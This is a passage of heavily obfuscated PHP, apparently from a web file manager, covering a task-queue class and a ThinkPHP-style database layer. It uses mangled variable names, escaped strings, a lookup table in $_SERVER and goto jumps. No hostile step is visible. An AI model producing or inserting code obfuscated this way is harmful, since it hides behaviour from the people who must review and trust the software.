size_format($„¥óŞšÇ[$¡—ŒÇúî[1743]]) . $¡—ŒÇúî[18] . size_format($„¥óŞšÇ[$¡—ŒÇúî[803]]); } echoLog($³ÃŠßÖ» . $¡—ŒÇúî[63] . $Îõ‡å‡¬, !0); } public function taskEnd($–´á¡Ğğ) { $óşØ¨®± =& $_SERVER[ú÷îèÆÜ]; if (!$–´á¡Ğğ || $this->taskID != $–´á¡Ğğ[$óşØ¨®±[452]]) { return; } $”¼æàí‚ = $–´á¡Ğğ ? $–´á¡Ğğ[$óşØ¨®±[1686]] . $óşØ¨®±[18] . $–´á¡Ğğ[$óşØ¨®±[826]] . LNG($óşØ¨®±[1778]) . $óşØ¨®±[81] : $óşØ¨®±[22]; echoLog($óşØ¨®±[1780] . $–´á¡Ğğ[$óşØ¨®±[1582]] . ($–´á¡Ğğ[$óşØ¨®±[503]] ? $óşØ¨®±[81] . $–´á¡Ğğ[$óşØ¨®±[503]] : $óşØ¨®±[22]) . $óşØ¨®±[81] . $”¼æàí‚ . $óşØ¨®±[1781] . sprintf($óşØ¨®±[891], timeFloat() - $–´á¡Ğğ[$óşØ¨®±[1689]]) . $óşØ¨®±[1701]); $this->end(); } public function taskKill($ÂÆş÷¡¼) { $ÏÖîÖ¹î =& $_SERVER[ú÷îèÆÜ]; if (!$ÂÆş÷¡¼ || $this->taskID != $ÂÆş÷¡¼[$ÏÖîÖ¹î[452]]) { return; } echoLog($ÏÖîÖ¹î[1782] . $ÂÆş÷¡¼[$ÏÖîÖ¹î[1582]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\121\x75\x65\165\x65\x4c\145\156\x67\x74\150"; const QUEUE_DATA = "\164\141\163\x6b\121\165\x65\165\x65\104\141\164\141"; const QUEUE_TIME = "\164\141\163\x6b\x51\165\x65\x75\145\114\x61\163\x74\122\x75\156"; const QUEUE_THREAD = "\x74\x61\163\x6b\121\165\145\x75\145\124\150\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ôµ¢ˆÄå, $¶ÄÎ´å = array(), $ßİßì’ = '', $ÓºÀûÏ = '') { $¢´ÚŒÒ =& $_SERVER[ú÷îèÆÜ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÓºÀûÏ && array_find_by_field(self::$listData, $¢´ÚŒÒ[104], $ÓºÀûÏ)) { return !0; } if ($ÓºÀûÏ && array_find_by_field(self::$listDataAdd, $¢´ÚŒÒ[104], $ÓºÀûÏ)) { return !0; } self::$listDataAdd[] = array($¢´ÚŒÒ[317] => $ôµ¢ˆÄå, $¢´ÚŒÒ[1783] => $¶ÄÎ´å, $¢´ÚŒÒ[503] => $ßİßì’, $¢´ÚŒÒ[104] => $ÓºÀûÏ); return !0; } public static function addSubmit() { $£Â³û’‡ =& $_SERVER[ú÷îèÆÜ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($£Â³û’‡[1784] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $£Â³û’‡[22], $£Â³û’‡[503])), $£Â³û’‡[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ç˜Š¾ğ¸, $‚Ğ¦¬â = array(), $üå×³ûŒ = '', $Ö´²œÜÏ = '') { $¢½…ø¸Ù =& $_SERVER[ú÷îèÆÜ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $şø“Ñ £ = self::getAll(); if ($Ö´²œÜÏ && array_find_by_field($şø“Ñ £, $¢½…ø¸Ù[104], $Ö´²œÜÏ)) { return !0; } $şø“Ñ £[] = array($¢½…ø¸Ù[317] => $ç˜Š¾ğ¸, $¢½…ø¸Ù[1783] => $‚Ğ¦¬â, $¢½…ø¸Ù[503] => $üå×³ûŒ, $¢½…ø¸Ù[104] => $Ö´²œÜÏ); self::setAll($şø“Ñ £); write_log($¢½…ø¸Ù[1784] . $üå×³ûŒ, $¢½…ø¸Ù[195]); return !0; } public static function run() { $“£îÙ“§ =& $_SERVER[ú÷îèÆÜ]; $ü¤Õ–í = self::getAll(); $øù³¡ğ = array_shift($ü¤Õ–í); if (!$øù³¡ğ) { return !1; } self::setAll($ü¤Õ–í); $ÏˆÑş§ü = timeFloat(); $ÕÊ×Æƒ¬ = $“£îÙ“§[22]; try { $ÕÊ×Æƒ¬ = Hook::apply($øù³¡ğ[$“£îÙ“§[317]], $øù³¡ğ[$“£îÙ“§[1783]]); } catch (Exception $º–ÛŒ„°) { write_log($º–ÛŒ„°, $“£îÙ“§[1223]); } $Õ…Üû = number_format(timeFloat() - $ÏˆÑş§ü, 3) . $“£îÙ“§[1701]; if ($ÕÊ×Æƒ¬ && is_string($ÕÊ×Æƒ¬)) { $Õ…Üû = $Õ…Üû . $“£îÙ“§[1785] . $ÕÊ×Æƒ¬; } write_log($“£îÙ“§[1786] . $øù³¡ğ[$“£îÙ“§[503]] . $“£îÙ“§[1787] . $Õ…Üû, $“£îÙ“§[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $êèöª€æ =& $_SERVER[ú÷îèÆÜ]; $å°ÀÆµ„ = self::threadCount() + 1; if ($å°ÀÆµ„ > 3 || !self::count()) { return; } write_log($êèöª€æ[1788] . $å°ÀÆµ„, $êèöª€æ[195]); Cache::set(self::QUEUE_THREAD, $å°ÀÆµ„, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($êèöª€æ[1789], $êèöª€æ[195]); } public static function getKey($›êÏê£§, $æáËæ™ = "\151\156\164") { $¤šÀä =& $_SERVER[ú÷îèÆÜ]; Cache::removeMemory($›êÏê£§); $ïàùÎıÁ = Cache::get($›êÏê£§); if ($æáËæ™ == $¤šÀä[341]) { return $ïàùÎıÁ ? intval($ïàùÎıÁ) : 0; } if ($æáËæ™ == $¤šÀä[1790]) { return is_array($ïàùÎıÁ) ? $ïàùÎıÁ : array(); } return $ïàùÎıÁ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ú÷îèÆÜ][1790]); } public static function setAll($ÆÁó½Àá) { $»çò°¡Ã = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÆÁó½Àá), $»çò°¡Ã); Cache::set(self::QUEUE_DATA, $ÆÁó½Àá, $»çò°¡Ã); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto A«í‰ğñØ™; dòÍ‚­õ”â: class DbSqlite3 extends DbSqlite3Base { public function query($İ®©¸õè) { $¨í•Ô…á =& $_SERVER[ú÷îèÆÜ]; if (!CacheLock::fileLock($¨í•Ô…á[23])) { return !1; } $®Æ¤èùÕ = parent::query($İ®©¸õè); CacheLock::fileUnLock($¨í•Ô…á[23]); return $®Æ¤èùÕ; } public function execute($¢Ï†Âƒµ) { $İ­ò·ÇË =& $_SERVER[ú÷îèÆÜ]; if (!CacheLock::fileLock($İ­ò·ÇË[23])) { return !1; } $Öş»¿«î = parent::execute($¢Ï†Âƒµ); CacheLock::fileUnLock($İ­ò·ÇË[23]); return $Öş»¿«î; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\x3c\x3e", "\147\x74" => "\76", "\x65\147\164" => "\x3e\x3d", "\x6c\164" => "\74", "\145\x6c\x74" => "\74\75", "\156\x6f\164\x6c\x69\153\145" => "\x4e\117\x54\40\114\111\113\105", "\154\151\x6b\x65" => "\x4c\111\x4b\x45", "\151\x6e" => "\111\x4e", "\156\x6f\x74\x69\x6e" => "\x4e\117\x54\40\x49\x4e", "\156\x6f\x74\x20\x69\156" => "\x4e\117\124\40\x49\x4e", "\142\x65\164\x77\145\x65\x6e" => "\x42\105\x54\x57\x45\105\116", "\x6e\157\164\142\145\164\167\145\x65\x6e" => "\116\x4f\124\x20\102\105\124\x57\x45\105\116", "\x6e\x6f\x74\x20\142\x65\x74\x77\145\x65\x6e" => "\116\x4f\124\40\x42\105\x54\x57\x45\x45\116"); protected $selectSql = "\123\x45\x4c\105\x43\x54\45\x44\x49\x53\x54\x49\x4e\103\x54\45\40\45\106\111\x45\x4c\104\45\40\x46\122\117\115\40\x25\x54\101\x42\x4c\x45\x25\x25\112\117\111\x4e\x25\45\127\110\x45\x52\x45\45\x25\107\122\117\x55\120\x25\x25\110\x41\x56\111\116\107\45\45\117\x52\x44\x45\122\x25\45\x4c\x49\115\111\124\45\x20\x25\125\116\111\117\116\45\x25\x43\117\x4d\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $š×»— = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ú÷îèÆÜ][1001], $š×»—); } public function factory($“õ×ÙÜƒ = '') { $²’²Ñ¸ =& $_SERVER[ú÷îèÆÜ]; $“õ×ÙÜƒ = $this->parseConfig($“õ×ÙÜƒ); if (empty($“õ×ÙÜƒ[$²’²Ñ¸[1002]])) { think_exception(think_lang($²’²Ñ¸[1003])); } $this->dbType = ucwords(strtolower($“õ×ÙÜƒ[$²’²Ñ¸[1002]])); $÷Èí‹ı = $²’²Ñ¸[1004] . $this->dbType; if (class_exists($÷Èí‹ı)) { $ãÉãÛÑ  = new $÷Èí‹ı($“õ×ÙÜƒ); if ($²’²Ñ¸[1005] != strtolower($“õ×ÙÜƒ[$²’²Ñ¸[1002]])) { $ãÉãÛÑ ->dbType = strtoupper($this->dbType); } else { $ãÉãÛÑ ->dbType = $this->_getDsnType($“õ×ÙÜƒ[$²’²Ñ¸[957]]); } } else { think_exception(think_lang($²’²Ñ¸[1006]) . $²’²Ñ¸[1007] . $÷Èí‹ı); } return $ãÉãÛÑ ; } public function __call($÷ïŠ©æÅ, $áÁ“ì¯ú) { if (method_exists($this, $÷ïŠ©æÅ)) { return call_user_func_array(array($this, $÷ïŠ©æÅ), $áÁ“ì¯ú); } } protected function _getDsnType($ì·ÊÚìå) { $åü¾ªó = explode($_SERVER[ú÷îèÆÜ][4], $ì·ÊÚìå); $úŞ†Üş = strtoupper(trim($åü¾ªó[0])); return $úŞ†Üş; } private function parseConfig($³‹ØÔÜö = '') { $ºè¶ş©ñ =& $_SERVER[ú÷îèÆÜ]; if (!empty($³‹ØÔÜö) && is_string($³‹ØÔÜö)) { $³‹ØÔÜö = $this->parseDSN($³‹ØÔÜö); } elseif (is_array($³‹ØÔÜö)) { $³‹ØÔÜö = array_change_key_case($³‹ØÔÜö); $³‹ØÔÜö = array($ºè¶ş©ñ[1002] => $³‹ØÔÜö[$ºè¶ş©ñ[1008]], $ºè¶ş©ñ[929] => $³‹ØÔÜö[$ºè¶ş©ñ[1009]], $ºè¶ş©ñ[930] => $³‹ØÔÜö[$ºè¶ş©ñ[1010]], $ºè¶ş©ñ[927] => $³‹ØÔÜö[$ºè¶ş©ñ[1011]], $ºè¶ş©ñ[928] => $³‹ØÔÜö[$ºè¶ş©ñ[1012]], $ºè¶ş©ñ[31] => $³‹ØÔÜö[$ºè¶ş©ñ[1013]], $ºè¶ş©ñ[957] => $³‹ØÔÜö[$ºè¶ş©ñ[1014]], $ºè¶ş©ñ[27] => isset($³‹ØÔÜö[$ºè¶ş©ñ[1015]]) ? $³‹ØÔÜö[$ºè¶ş©ñ[1015]] : array()); } elseif (empty($³‹ØÔÜö)) { if (think_config($ºè¶ş©ñ[1016]) && $ºè¶ş©ñ[1005] != strtolower(think_config($ºè¶ş©ñ[1017]))) { $³‹ØÔÜö = $this->parseDSN(think_config($ºè¶ş©ñ[1016])); } else { $³‹ØÔÜö = array($ºè¶ş©ñ[1002] => think_config($ºè¶ş©ñ[1017]), $ºè¶ş©ñ[929] => think_config($ºè¶ş©ñ[1018]), $ºè¶ş©ñ[930] => think_config($ºè¶ş©ñ[1019]), $ºè¶ş©ñ[927] => think_config($ºè¶ş©ñ[1020]), $ºè¶ş©ñ[928] => think_config($ºè¶ş©ñ[1021]), $ºè¶ş©ñ[31] => think_config($ºè¶ş©ñ[299]), $ºè¶ş©ñ[957] => think_config($ºè¶ş©ñ[1016]), $ºè¶ş©ñ[27] => think_config($ºè¶ş©ñ[1022])); } } return $³‹ØÔÜö; } protected function initConnect($ÅÂÊ¶éø = true) { if (1 == think_config($_SERVER[ú÷îèÆÜ][32])) { $this->_linkID = $this->multiConnect($ÅÂÊ¶éø); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $—ûºˆÂ => $ª©ËµŠ) { $this->_linkID = $ª©ËµŠ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($·ÍÚÈı = false) { $´ôøòü =& $_SERVER[ú÷îèÆÜ]; static $¨ŒÇâ° = array(); static $¼áåÖå = -1; if (empty($¨ŒÇâ°)) { foreach ($this->config as $úì»€“– => $ªíñŒŒ¼) { $¨ŒÇâ°[$úì»€“–] = explode($´ôøòü[60], $ªíñŒŒ¼); } } if (think_config($´ôøòü[1023])) { if ($·ÍÚÈı || think_config($´ôøòü[448]) === !0) { $Ûªİç = floor(mt_rand(0, think_config($´ôøòü[1024]) - 1)); $¼áåÖå = $Ûªİç; } else { if (is_numeric(think_config($´ôøòü[1025]))) { $Ûªİç = think_config($´ôøòü[1025]); } else { $Ûªİç = floor(mt_rand(think_config($´ôøòü[1024]), count($¨ŒÇâ°[$´ôøòü[927]]) - 1)); } } } else { $Ûªİç = floor(mt_rand(0, count($¨ŒÇâ°[$´ôøòü[927]]) - 1)); $¼áåÖå = $Ûªİç; } $Ûªİç = $¼áåÖå !== -1 ? $¼áåÖå : $Ûªİç; $ìÃÓ‘±ï = array($´ôøòü[929] => isset($¨ŒÇâ°[$´ôøòü[929]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[929]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[929]][0], $´ôøòü[930] => isset($¨ŒÇâ°[$´ôøòü[930]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[930]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[930]][0], $´ôøòü[927] => isset($¨ŒÇâ°[$´ôøòü[927]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[927]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[927]][0], $´ôøòü[928] => isset($¨ŒÇâ°[$´ôøòü[928]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[928]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[928]][0], $´ôøòü[31] => isset($¨ŒÇâ°[$´ôøòü[31]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[31]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[31]][0], $´ôøòü[957] => isset($¨ŒÇâ°[$´ôøòü[957]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[957]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[957]][0], $´ôøòü[27] => isset($¨ŒÇâ°[$´ôøòü[27]][$Ûªİç]) ? $¨ŒÇâ°[$´ôøòü[27]][$Ûªİç] : $¨ŒÇâ°[$´ôøòü[27]][0]); return $this->connect($ìÃÓ‘±ï, $Ûªİç); } public function parseDSN($”òĞÍö¡) { $˜ö…ù¬ =& $_SERVER[ú÷îèÆÜ]; if (empty($”òĞÍö¡)) { return !1; } $²Ø¯óì¢ = parse_url($”òĞÍö¡); if ($²Ø¯óì¢[$˜ö…ù¬[205]]) { $²ÖØ¼ºÃ = array($˜ö…ù¬[1002] => $²Ø¯óì¢[$˜ö…ù¬[205]], $˜ö…ù¬[929] => isset($²Ø¯óì¢[$˜ö…ù¬[639]]) ? $²Ø¯óì¢[$˜ö…ù¬[639]] : $˜ö…ù¬[22], $˜ö…ù¬[930] => isset($²Ø¯óì¢[$˜ö…ù¬[1026]]) ? $²Ø¯óì¢[$˜ö…ù¬[1026]] : $˜ö…ù¬[22], $˜ö…ù¬[927] => isset($²Ø¯óì¢[$˜ö…ù¬[206]]) ? $²Ø¯óì¢[$˜ö…ù¬[206]] : $˜ö…ù¬[22], $˜ö…ù¬[928] => isset($²Ø¯óì¢[$˜ö…ù¬[207]]) ? $²Ø¯óì¢[$˜ö…ù¬[207]] : $˜ö…ù¬[22], $˜ö…ù¬[31] => isset($²Ø¯óì¢[$˜ö…ù¬[94]]) ? substr($²Ø¯óì¢[$˜ö…ù¬[94]], 1) : $˜ö…ù¬[22]); } else { preg_match($˜ö…ù¬[1027], trim($”òĞÍö¡), $ùÍçµ¥İ); $²ÖØ¼ºÃ = array($˜ö…ù¬[1002] => $ùÍçµ¥İ[1], $˜ö…ù¬[929] => $ùÍçµ¥İ[2], $˜ö…ù¬[930] => $ùÍçµ¥İ[3], $˜ö…ù¬[927] => $ùÍçµ¥İ[4], $˜ö…ù¬[928] => $ùÍçµ¥İ[5], $˜ö…ù¬[31] => $ùÍçµ¥İ[6]); } $²ÖØ¼ºÃ[$˜ö…ù¬[957]] = $˜ö…ù¬[22]; return $²ÖØ¼ºÃ; } protected function debug() { $¿êşâ¤ =& $_SERVER[ú÷îèÆÜ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¿êşâ¤[1028]; if (think_config($¿êşâ¤[1029])) { think_status($¿êşâ¤[1030]); think_trace($this->queryStr . $¿êşâ¤[1031] . think_status($¿êşâ¤[34], $¿êşâ¤[1030], 6) . $¿êşâ¤[1032], $¿êşâ¤[22], $¿êşâ¤[1033]); } } protected function parseLock($­œš½¾ø = false) { $ÆŒ„Ôüô =& $_SERVER[ú÷îèÆÜ]; if (!$­œš½¾ø) { return $ÆŒ„Ôüô[22]; } if ($ÆŒ„Ôüô[959] == $this->dbType) { return $ÆŒ„Ôüô[1034]; } return $ÆŒ„Ôüô[1035]; } protected function parseSet($ñ¨ Ü) { $åÍ¶ñú =& $_SERVER[ú÷îèÆÜ]; foreach ($ñ¨ Ü as $ÀÄß›¬ => $‹Ï„ß¡ñ) { if (is_array($‹Ï„ß¡ñ) && $åÍ¶ñú[350] == $‹Ï„ß¡ñ[0]) { $áì÷¸éÃ[] = $this->parseKey($ÀÄß›¬) . $åÍ¶ñú[925] . $‹Ï„ß¡ñ[1]; } elseif (is_scalar($‹Ï„ß¡ñ) || is_null($‹Ï„ß¡ñ)) { $áì÷¸éÃ[] = $this->parseKey($ÀÄß›¬) . $åÍ¶ñú[925] . $this->parseValue($‹Ï„ß¡ñ); } } return $åÍ¶ñú[1036] . implode($åÍ¶ñú[60], $áì÷¸éÃ); } protected function bindParam($ˆÛ»º¤‡, $Ñ¯Å¶™Ğ) { $this->bind[$_SERVER[ú÷îèÆÜ][4] . $ˆÛ»º¤‡] = $Ñ¯Å¶™Ğ; } protected function parseBind($Ôø©ø) { $Ôø©ø = array_merge($this->bind, $Ôø©ø); $this->bind = array(); return $Ôø©ø; } function parseKey(&$ùŸç«ı, $¯ó¬Ë„Û = true) { if ($¯ó¬Ë„Û) { $ùŸç«ı = $this->parseKeyCheck($ùŸç«ı); } return $ùŸç«ı; } function parseKeyCheck($¡›®À) { $±Ñ—‘Ü‚ =& $_SERVER[ú÷îèÆÜ]; $¡›®À = trim($¡›®À); if (!preg_match($±Ñ—‘Ü‚[1037], $¡›®À)) { think_exception($±Ñ—‘Ü‚[1038] . $¡›®À); } return $¡›®À; } protected function parseValue($ã÷Ã¿) { $©ìê ­ =& $_SERVER[ú÷îèÆÜ]; if (is_string($ã÷Ã¿)) { $ã÷Ã¿ = $©ìê ­[998] . $this->escapeString($ã÷Ã¿) . $©ìê ­[998]; } elseif (isset($ã÷Ã¿[0]) && is_string($ã÷Ã¿[0]) && strtolower($ã÷Ã¿[0]) == $©ìê ­[350]) { $ã÷Ã¿ = $this->escapeString($ã÷Ã¿[1]); } elseif (is_array($ã÷Ã¿)) { $ã÷Ã¿ = array_map(array($this, $©ìê ­[999]), $ã÷Ã¿); } elseif (is_bool($ã÷Ã¿)) { $ã÷Ã¿ = $ã÷Ã¿ ? $©ìê ­[98] : $©ìê ­[222]; } elseif (is_null($ã÷Ã¿)) { $ã÷Ã¿ = $©ìê ­[113]; } return $ã÷Ã¿; } protected function parseField($¨ì±Ö¢å) { $Ğ¬¢õ˜Ø =& $_SERVER[ú÷îèÆÜ]; if (is_string($¨ì±Ö¢å) && strpos($¨ì±Ö¢å, $Ğ¬¢õ˜Ø[60])) { $¨ì±Ö¢å = explode($Ğ¬¢õ˜Ø[60], $¨ì±Ö¢å); } if (is_array($¨ì±Ö¢å)) { $ùÊíáÍ— = array(); foreach ($¨ì±Ö¢å as $É÷´ğ¸ => $Ø÷´¦ãÌ) { if (!is_numeric($É÷´ğ¸)) { $ùÊíáÍ—[] = $this->parseKey($É÷´ğ¸, !1) . $Ğ¬¢õ˜Ø[1039] . $this->parseKey($Ø÷´¦ãÌ); } else { $ùÊíáÍ—[] = $this->parseKey($Ø÷´¦ãÌ); } } $»‡ºúÀ = implode($Ğ¬¢õ˜Ø[60], $ùÊíáÍ—); } elseif (is_string($¨ì±Ö¢å) && !empty($¨ì±Ö¢å)) { $»‡ºúÀ = $¨ì±Ö¢å; } else { $»‡ºúÀ = $Ğ¬¢õ˜Ø[213]; } return $»‡ºúÀ; } protected function parseTable($êü–¢‚¢) { $‡•ìôä€ =& $_SERVER[ú÷îèÆÜ]; if (is_array($êü–¢‚¢)) { $Á¶â‹‰× = array(); foreach ($êü–¢‚¢ as $¶ŠÛœş’ => $ÃÀ˜–íÙ) { if (!is_numeric($¶ŠÛœş’)) { $Á¶â‹‰×[] = $this->parseKey($¶ŠÛœş’) . $‡•ìôä€[63] . $this->parseKey($ÃÀ˜–íÙ); } else { $Á¶â‹‰×[] = $this->parseKey($¶ŠÛœş’); } } $êü–¢‚¢ = $Á¶â‹‰×; } elseif (is_string($êü–¢‚¢)) { if (strstr($êü–¢‚¢, $‡•ìôä€[63])) { return $êü–¢‚¢; } $êü–¢‚¢ = explode($‡•ìôä€[60], $êü–¢‚¢); array_walk($êü–¢‚¢, array($this, $‡•ìôä€[947])); } return $‡•ìôä€[941] . trim(implode($‡•ìôä€[1040], $êü–¢‚¢), $‡•ìôä€[438]) . $‡•ìôä€[941]; } protected function parseWhere($‹Á³Û¤‹) { $Œ–ì”ñ =& $_SERVER[ú÷îèÆÜ]; $¦ğ¬İâ• = $Œ–ì”ñ[22]; if (is_string($‹Á³Û¤‹)) { $¦ğ¬İâ• = $‹Á³Û¤‹; } else { $”’ñ™¥ = isset($‹Á³Û¤‹[$Œ–ì”ñ[1041]]) ? strtoupper($‹Á³Û¤‹[$Œ–ì”ñ[1041]]) : $Œ–ì”ñ[22]; if (in_array($”’ñ™¥, array($Œ–ì”ñ[1042], $Œ–ì”ñ[1043], $Œ–ì”ñ[1044]))) { $”’ñ™¥ = $Œ–ì”ñ[63] . $”’ñ™¥ . $Œ–ì”ñ[63]; unset($‹Á³Û¤‹[$Œ–ì”ñ[1041]]); } else { $”’ñ™¥ = $Œ–ì”ñ[1045]; } foreach ($‹Á³Û¤‹ as $ ƒáĞ¬õ => $íìõéÏ) { $¦ğ¬İâ• .= $Œ–ì”ñ[330]; if (is_numeric($ ƒáĞ¬õ)) { $ ƒáĞ¬õ = $Œ–ì”ñ[1046]; } if (0 === strpos($ ƒáĞ¬õ, $Œ–ì”ñ[21])) { $¦ğ¬İâ• .= $this->parseThinkWhere($ ƒáĞ¬õ, $íìõéÏ); } else { if (!preg_match($Œ–ì”ñ[1047], trim($ ƒáĞ¬õ))) { think_exception(think_lang($Œ–ì”ñ[1048]) . $Œ–ì”ñ[4] . $ ƒáĞ¬õ); } $¿¹ùíôß = is_array($íìõéÏ) && isset($íìõéÏ[$Œ–ì”ñ[1049]]); $ ƒáĞ¬õ = trim($ ƒáĞ¬õ); if (strpos($ ƒáĞ¬õ, $Œ–ì”ñ[336])) { $š¨¾Šú = explode($Œ–ì”ñ[336], $ ƒáĞ¬õ); $­äÄÍêË = array(); foreach ($š¨¾Šú as $à‹´Ï÷í => $—ßæÑ“) { $·ÇÑÑ–¯ = $¿¹ùíôß ? $íìõéÏ[$à‹´Ï÷í] : $íìõéÏ; $­äÄÍêË[] = $Œ–ì”ñ[313] . $this->parseWhereItem($this->parseKey($—ßæÑ“), $·ÇÑÑ–¯) . $Œ–ì”ñ[946]; } $¦ğ¬İâ• .= implode($Œ–ì”ñ[1050], $­äÄÍêË); } elseif (strpos($ ƒáĞ¬õ, $Œ–ì”ñ[337])) { $š¨¾Šú = explode($Œ–ì”ñ[337], $ ƒáĞ¬õ); $­äÄÍêË = array(); foreach ($š¨¾Šú as $à‹´Ï÷í => $—ßæÑ“) { $·ÇÑÑ–¯ = $¿¹ùíôß ? $íìõéÏ[$à‹´Ï÷í] : $íìõéÏ; $­äÄÍêË[] = $Œ–ì”ñ[313] . $this->parseWhereItem($this->parseKey($—ßæÑ“), $·ÇÑÑ–¯) . $Œ–ì”ñ[946]; } $¦ğ¬İâ• .= implode($Œ–ì”ñ[1045], $­äÄÍêË); } else { $¦ğ¬İâ• .= $this->parseWhereItem($this->parseKey($ ƒáĞ¬õ), $íìõéÏ); } } $¦ğ¬İâ• .= $Œ–ì”ñ[331] . $”’ñ™¥; } $¦ğ¬İâ• = substr($¦ğ¬İâ•, 0, -strlen($”’ñ™¥)); } return empty($¦ğ¬İâ•) ? $Œ–ì”ñ[22] : $Œ–ì”ñ[1051] . $¦ğ¬İâ•; } protected function parseWhereItem($€Ñ´ë¶µ, $¨™Û²¶í) { $•Ñ”ÛÔ™ =& $_SERVER[ú÷îèÆÜ]; $¿ŸÓÄ‘Ş = $•Ñ”ÛÔ™[22]; if (is_array($¨™Û²¶í)) { if (is_string($¨™Û²¶í[0])) { $º¿œòĞœ = strtolower($¨™Û²¶í[0]); if (in_array($¨™Û²¶í[0], array($•Ñ”ÛÔ™[925], $•Ñ”ÛÔ™[1052], $•Ñ”ÛÔ™[1053], $•Ñ”ÛÔ™[1054], $•Ñ”ÛÔ™[1055], $•Ñ”ÛÔ™[1056]))) { $¿ŸÓÄ‘Ş .= $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $¨™Û²¶í[0] . $•Ñ”ÛÔ™[63] . $this->parseValue($¨™Û²¶í[1]); } elseif (preg_match($•Ñ”ÛÔ™[1057], $¨™Û²¶í[0])) { $¿ŸÓÄ‘Ş .= $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $this->exp[$º¿œòĞœ] . $•Ñ”ÛÔ™[63] . $this->parseValue($¨™Û²¶í[1]); } elseif (preg_match($•Ñ”ÛÔ™[1058], $¨™Û²¶í[0])) { if (is_array($¨™Û²¶í[1])) { $«ç›Úª÷ = isset($¨™Û²¶í[2]) ? strtoupper($¨™Û²¶í[2]) : $•Ñ”ÛÔ™[1043]; if (in_array($«ç›Úª÷, array($•Ñ”ÛÔ™[1042], $•Ñ”ÛÔ™[1043], $•Ñ”ÛÔ™[1044]))) { $ÖãŸÆ€Š = array(); foreach ($¨™Û²¶í[1] as $ºòÌ›©º) { $ÖãŸÆ€Š[] = $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $this->exp[$º¿œòĞœ] . $•Ñ”ÛÔ™[63] . $this->parseValue($ºòÌ›©º); } $¿ŸÓÄ‘Ş .= $•Ñ”ÛÔ™[313] . implode($•Ñ”ÛÔ™[63] . $«ç›Úª÷ . $•Ñ”ÛÔ™[63], $ÖãŸÆ€Š) . $•Ñ”ÛÔ™[946]; } } else { $¿ŸÓÄ‘Ş .= $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $this->exp[$º¿œòĞœ] . $•Ñ”ÛÔ™[63] . $this->parseValue($¨™Û²¶í[1]); } } elseif ($•Ñ”ÛÔ™[350] == $º¿œòĞœ) { $¿ŸÓÄ‘Ş .= $•Ñ”ÛÔ™[944] . $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $¨™Û²¶í[1] . $•Ñ”ÛÔ™[1059]; } elseif (preg_match($•Ñ”ÛÔ™[1060], $¨™Û²¶í[0])) { $¿ŸÓÄ‘Ş .= $¨™Û²¶í[0]; } elseif (preg_match($•Ñ”ÛÔ™[1061], $¨™Û²¶í[0])) { if (isset($¨™Û²¶í[2]) && $•Ñ”ÛÔ™[350] == $¨™Û²¶í[2]) { $¿ŸÓÄ‘Ş .= $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $this->exp[$º¿œòĞœ] . $•Ñ”ÛÔ™[63] . $¨™Û²¶í[1]; } else { if (is_string($¨™Û²¶í[1])) { $¨™Û²¶í[1] = explode($•Ñ”ÛÔ™[60], $¨™Û²¶í[1]); } $—åï¯ŞÓ = implode($•Ñ”ÛÔ™[60], $this->parseValue($¨™Û²¶í[1])); $¿ŸÓÄ‘Ş .= $€Ñ´ë¶µ . $•Ñ”ÛÔ™[63] . $this->exp[$º¿œòĞœ] . $•Ñ”ÛÔ™[944] . 